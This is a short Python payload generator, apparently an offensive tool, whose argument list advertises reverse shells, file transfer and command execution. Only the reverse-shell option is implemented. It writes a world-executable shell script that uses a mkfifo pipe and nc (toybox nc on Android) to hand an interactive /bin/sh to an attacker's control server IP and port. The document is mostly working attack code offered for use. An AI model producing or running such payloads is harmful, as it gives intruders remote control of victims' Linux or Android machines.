#!/usr/bin/python3

import argparse
import os

arg_parser = argparse.ArgumentParser(description="Generate some payloads")
arg_parser.add_argument("-r", action="store_true",
    help="Create a reverse shell")
arg_parser.add_argument("-i", action="store", 
    help="Control server IP address")
arg_parser.add_argument("-p", action="store",
    help="Control server port", default=8888)
arg_parser.add_argument("-o", action="store", default="payload.sh",
    help="Output file")
arg_parser.add_argument("-d", action="store",
    help="Download file <path>")
arg_parser.add_argument("-u", action="store",
    help="Upload file <path>")
arg_parser.add_argument("-z", action="store_true",
    help="Get system information")
arg_parser.add_argument("-a", default="x86",
    help="architecture: x86|arm")
arg_parser.add_argument("-c", action="store",
    help="command to execute")
arg_parser.add_argument("-m", default="linux",
    help="Machine type: linux|android")
arg_parser.add_argument("--ndk", help="Path to NDK")
arg_parser.add_argument("--gcc", default="gcc",
    help="Path to GCC (Overridden if NDK is supplied)")   
arg_parser.add_argument("sources", nargs="?")
args = arg_parser.parse_args()

def reverse_shell():
    shellcode = 'set +e\n'
    if args.m == "linux":
        shellcode = shellcode + "rm -f /tmp/f; mkfifo /tmp/f\n"''
        shellcode = shellcode + "cat /tmp/f | /bin/sh -i 2>&1 | " + "nc " + str(args.i) + " " + str(args.p) + " > /tmp/f\n"
    elif args.m == "android":
        shellcode = shellcode + "rm -f /sdcard/f; mkfifo /sdcard/f\n"''
        shellcode = shellcode + "cat /sdcard/f | /bin/sh -i 2>&1 | " + "toybox nc " + str(args.i) + " " + str(args.p) + " > /sdcard/f"+ " > /sdcard/f\n"
    else:
        print("Invalid machine type")
    f = open(args.o, "w")
    f.write(shellcode + "\n")
    f.close()
    os.chmod(args.o, int('777', base=8))

if args.r:
    reverse_shell()


    